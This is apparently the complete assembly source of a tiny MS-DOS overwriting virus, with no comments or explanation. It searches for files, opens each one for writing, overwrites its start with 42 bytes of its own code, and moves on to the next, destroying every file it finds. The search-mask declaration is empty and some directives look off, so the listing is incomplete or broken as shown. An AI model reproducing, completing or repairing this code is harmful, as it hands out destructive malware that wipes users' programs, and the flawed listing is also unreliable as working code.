	
	.model small
	.code
	FNAME EQU 9EH
		  ORG 10H
	START:
		mov ah,4EH
		mov dx,OFFSET COM_FILE
		int 21H


	SEARCH_LP:
		jc	DONE
		mov ax,3D01H
		mov dx,FNAME
		int 21H

		xchg ax,bx
		mov ah,40H
		mov cl,42
		mov dx,100H
		int 21H

		mov ah,3EH
		int 21H

		mov ah,4FH
		int 21H
		jmp SEARCH_LP
	DONE:
		ret
	COM_FILE DB
		END START


